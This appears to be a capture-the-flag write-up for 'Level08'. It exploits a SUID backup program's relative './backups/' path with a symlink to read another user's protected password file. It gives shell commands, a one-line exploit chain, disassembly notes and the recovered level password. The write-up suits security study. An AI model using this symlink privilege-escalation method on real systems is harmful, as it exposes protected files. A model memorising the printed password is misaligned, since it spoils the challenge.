# Level08 - File Backup Exploit

## Overview
Level08 exploits a SUID binary that performs file backup operations using relative paths. By creating a controlled environment and using symbolic links, we can trick the program into reading privileged files and writing them to locations we can access.

## Vulnerability Type
- **SUID Binary Exploitation**
- **Relative Path Vulnerability**
- **Symbolic Link Attack**

## Binary Information
- **Binary:** `/home/users/level08/level08`
- **Permissions:** `-rwsr-s---+` (SUID bit set, runs as level09)
- **Target:** `/home/users/level09/.pass`

## How It Works

### Program Behavior
1. The program expects exactly 2 arguments (argc == 2)
2. Opens a log file at `./backups/.log` for writing
3. Logs "Starting back up: [filename]"
4. Opens the input file (argv[1]) for reading **with level09 permissions**
5. Creates a backup at `./backups/[filename]`
6. Copies the input file contents to the backup
7. Logs "Finished back up [filename]"

### Key Vulnerabilities
1. **Relative Paths:** All file operations use `./backups/` relative to current directory
2. **SUID Execution:** Runs with level09 privileges, can read level09's files
3. **No Path Validation:** Doesn't check where it's being executed from

## Exploit Steps

### Step 1: Create Working Directory
```bash
cd /tmp
mkdir exploit
cd exploit
```

### Step 2: Create Required Directory Structure
```bash
mkdir -p backups
touch backups/.log
```

### Step 3: Test the Setup
```bash
~/level08 'AAAA'
cat backups/.log
```
**Expected Output:**
```
LOG: Starting back up: AAAA
```

### Step 4: Create Symbolic Link
```bash
ln -s /home/users/level09/.pass password
```

### Step 5: Execute Exploit
```bash
~/level08 password
```

### Step 6: Read the Password
```bash
cat backups/password
```

## Complete Exploit Command Chain
```bash
cd /tmp && \
mkdir -p exploit/backups && \
cd exploit && \
touch backups/.log && \
ln -s /home/users/level09/.pass password && \
~/level08 password && \
cat backups/password
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```

## Assembly Analysis

### Main Function Key Points

#### Argument Check (Line +50)
```bash
0x400a22 <+50>:  cmpl   $0x2,-0x94(%rbp)
0x400a29 <+57>:  je     0x400a4a <main+90>
```
Ensures exactly one argument is provided.

#### Log File Open (Line +90-106)
```bash
0x400a4f <+95>:  mov    $0x400d6d,%eax    ; "./backups/.log"
0x400a5a <+106>: callq  0x4007c0 <fopen@plt>
```
Opens log file in current directory (vulnerable to relative path manipulation).

#### Source File Open (Line +220)
```bash
0x400ac9 <+217>: mov    %rax,%rdi         ; argv[1] = our symlink
0x400acc <+220>: callq  0x4007c0 <fopen@plt>
```
Opens source file with **level09 SUID permissions** - can read protected files.

#### Backup Path Construction (Line +286-397)
```bash
0x400b0e <+286>: lea    -0x70(%rbp),%rax  ; Buffer = "./backups/"
0x400b7d <+397>: callq  0x400750 <strncat@plt>
```
Concatenates `"./backups/"` + `argv[1]` to create backup path.

#### Backup File Creation (Line +424)
```bash
0x400b98 <+424>: callq  0x4007b0 <open@plt>
```
Creates file at `./backups/password` in **our controlled directory**.

#### File Copy Loop (Line +517-502)
```bash
0x400bf5 <+517>: callq  0x400760 <fgetc@plt>  ; Read from source
0x400be6 <+502>: callq  0x400700 <write@plt>  ; Write to backup
```
Copies content byte-by-byte from protected file to our accessible location.

### log_wrapper Function

#### String Copy (Line +67)
```bash
0x400907 <+67>:  callq  0x4006f0 <strcpy@plt>
```
Copies format string into buffer.

#### Filename Append (Line +210)
```bash
0x400996 <+210>: callq  0x400740 <snprintf@plt>
```
Appends filename to log message.

#### Log Write (Line +273)
```bash
0x4009d5 <+273>: callq  0x4007a0 <fprintf@plt>
```
Writes log entry to file.



## GOT Entries (For Reference)
```
0000000000601f90 R_X86_64_JUMP_SLOT  fclose
0000000000601fa0 R_X86_64_JUMP_SLOT  printf
0000000000601fa8 R_X86_64_JUMP_SLOT  snprintf
0000000000601fd8 R_X86_64_JUMP_SLOT  fprintf
0000000000601ff0 R_X86_64_JUMP_SLOT  exit
```